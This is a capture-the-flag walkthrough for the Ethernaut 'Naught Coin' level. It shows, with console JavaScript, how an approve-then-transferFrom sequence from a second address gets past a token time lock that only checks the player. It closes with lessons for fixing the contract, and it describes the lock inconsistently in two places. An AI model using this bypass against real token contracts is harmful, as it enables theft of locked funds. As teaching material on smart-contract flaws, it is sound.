# Level 15: Naught Coin

## Challenge Overview

The Naught Coin challenge demonstrates the importance of understanding ERC-20 mechanics and how token transfer restrictions can be bypassed.  
In this level, all tokens are minted to the `player`, and any attempt by the player to transfer their tokens is blocked until a time lock expires.

## Goal

Transfer all of the Naught Coin tokens out of the `player` account before the time lock expires.



## Vulnerability Insight

The NaughtCoin contract applies a `lockTokens` modifier to both `transfer(...)` and `transferFrom(...)`,  
but that modifier only enforces the time lock when `msg.sender == player`.

In other words:

1. If the **player** calls `transfer(...)` or `transferFrom(...)`,  
   the `lockTokens` modifier checks `require(now > timeLock)`,  
   blocking transfers before the lock expires.

2. But if another address calls `transferFrom(player, recipient, amount)`,  
   it can "pull" tokens out of the player’s account even though the lock is in place.



## How to Exploit

### 1. Approve a Non-Player Address to Spend All Tokens

Because the time lock only blocks calls where `msg.sender == player`,  
you need **another address** (not the player) to invoke `transferFrom(player, recipient, amount)`.

To enable that:

- First, call `approve(spender, amount)` from the player's account,  
  authorizing that spender to draw down the player's full balance.

```javascript
// Read the player’s full balance (total supply is 1,000,000 tokens with 18 decimals)
const totalSupply = await contract.balanceOf(player);
console.log("Player’s balance:", totalSupply.toString());

// Approve recipientAddress to spend all tokens on your behalf:
await contract.approve(recipientAddress, totalSupply);
console.log("Approved recipientAddress for totalSupply");
```

### 2. “Pull” Tokens Out via `transferFrom`

Switch your MetaMask/account context so that `msg.sender` is the **non-player** you just approved (e.g. `recipientAddress`).  
Then call:

```javascript
// As recipientAddress:
await contract.transferFrom(player, recipientAddress, totalSupply);
console.log("transferFrom succeeded");
```

Because `msg.sender` is **not equal to player**,  
the `lockTokens` modifier does **not** check `require(now > timeLock)`,  
and the transfer goes through immediately.

### 3. Verify the Exploit

In the Ethernaut console:

```javascript
const newBalance = await contract.balanceOf(recipientAddress);
console.log("Recipient’s new balance:", newBalance.toString()); // Should equal totalSupply

const playerBalance = await contract.balanceOf(player);
console.log("Player’s balance (should be 0):", playerBalance.toString());
```

If the player’s balance is now zero and the recipient holds all tokens,  
you have bypassed the time lock. Finally, click **Submit** on the Ethernaut UI to complete the level.



## Lessons Learned

- `transferFrom` ignores per-function locks when someone other than the locked account calls it.
- Locking only `transfer()` isn’t enough—if you don’t also protect `transferFrom()`, someone can **take** tokens via that route.
- Giving a contract approval lets it move your tokens—don’t approve any address you don’t fully trust.
- A better approach is to put the time lock in a single `_beforeTokenTransfer` hook  
  so all transfers (not just `transfer()`) are held until the lock expires.
